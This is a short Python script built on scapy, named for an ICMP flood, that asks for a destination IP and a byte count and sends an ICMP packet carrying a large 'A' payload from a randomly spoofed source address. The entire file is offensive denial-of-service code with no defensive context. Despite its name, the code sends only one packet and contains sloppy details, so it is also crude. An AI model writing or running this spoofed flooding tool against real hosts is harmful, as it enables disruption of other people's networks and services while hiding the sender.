#!/usr/bin/python

from scapy.all import *
import string

def main():
    icmpflood()

def icmpflood():
    data = "A"
    target = DestinationIP()
    byte = input("How many byte do you sent [Press enter for 65500]: ")
    if byte == "":
        byte = 65500

    send(IP(src = RandIP(), dst=target, proto="icmp")/ICMP()/(data*int(byte)))
        
def DestinationIP():
    dstIP = input("Destination IP: ")
    return dstIP
    
main()